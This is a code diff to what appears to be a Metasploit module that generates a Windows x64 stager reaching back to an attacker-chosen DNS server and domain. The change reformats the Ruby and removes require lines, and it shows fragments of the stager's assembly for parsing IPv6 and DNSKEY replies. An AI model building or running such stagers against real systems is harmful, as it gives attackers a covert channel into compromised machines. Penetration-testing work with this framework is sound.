@@ -1,10 +1,5 @@
 # -*- coding: binary -*-
 
-require 'msf/core'
-require 'msf/core/payload/transport_config'
-require 'msf/core/payload/windows/x64/block_api'
-require 'msf/core/payload/windows/x64/exitfunk'
-
 module Msf
 
   ###
@@ -23,8 +18,8 @@ module Msf
     #
     # Generate the first stage
     #
-    def generate(opts={})
-      ds = opts[:datastore] || datastore
+    def generate(opts = {})
+      ds   = opts[:datastore] || datastore
       conf = {
               ns_server:   ds['NS_IP'],
               domain:      ds['DOMAIN'],
@@ -43,15 +38,14 @@ module Msf
       generate_reverse_dns(conf)
     end
 
-
-    def transport_config(opts={})
+    def transport_config(opts = {})
       transport_config_reverse_dns(opts)
     end
 
     #
     # Generate and compile the stager
     #
-    def generate_reverse_dns(opts={})
+    def generate_reverse_dns(opts = {})
       combined_asm = %Q^
       cld                    ; Clear the direction flag.
       and rsp, ~0xF          ;  Ensure RSP is 16 byte aligned
@@ -92,23 +86,23 @@ module Msf
     # @option opts [String]  :ns_server Optional: NS server, that will be used.
     # @option opts [Integer] :retry_count Number of retry attempts
     #
-    def asm_reverse_dns(opts={})
+    def asm_reverse_dns(opts = {})
 
-      retry_count  = [opts[:retry_count].to_i, 1000].max
-      domain       = "#{opts[:server_id]}.#{opts[:domain]}"
-      req_type     = opts[:req_type]
-      ns_server    = "0x%.8x" % Rex::Socket.addr_aton(opts[:ns_server]||"0.0.0.0").unpack("V").first
-      domain_length= domain.length + 18
+      retry_count   = [opts[:retry_count].to_i, 1000].max
+      domain        = "#{opts[:server_id]}.#{opts[:domain]}"
+      req_type      = opts[:req_type]
+      ns_server     = "0x%.8x" % Rex::Socket.addr_aton(opts[:ns_server] || "0.0.0.0").unpack("V").first
+      domain_length = domain.length + 18
 
-      alloc_stack  = (domain_length) + (8 - (domain_length % 8))
-      reliable     = opts[:reliable]
+      alloc_stack = (domain_length) + (8 - (domain_length % 8))
+      reliable    = opts[:reliable]
 
       dns_options  = 0x248
       request_type = 0x1c
 
       if req_type == "DNSKEY"
         dns_options  |= 2
-        request_type =  0x30
+        request_type = 0x30
       end
 
       #
@@ -303,7 +297,8 @@ module Msf
          mov         [rsp + 0x40], rax
          jmp         parse_end
        ^
-      else  # DNSKKEY
+      else
+        # DNSKKEY
         asm << %Q^
 
          add        rdx,0x28
@@ -385,7 +380,7 @@ module Msf
 
       ^
 
-      if req_type == "IPv6"     #IPv6
+      if req_type == "IPv6" #IPv6
         asm << %Q^
          mov         rdx, rax
          add         rdx, 0x20           ; RDX <-IP pointer
@@ -427,7 +422,8 @@ module Msf
          sub         [rsp + 0x50], rax
          jmp         ip_enum
       ^
-      else #DNSKEY
+      else
+        #DNSKEY
         asm << %Q^
         mov         ecx, dword ptr ds:[rax + 0x24]  ; RCX <- current size
         test        ecx, ecx
@@ -485,7 +481,6 @@ module Msf
 
       asm
     end
-
 
     def asm_functions_dns()
 
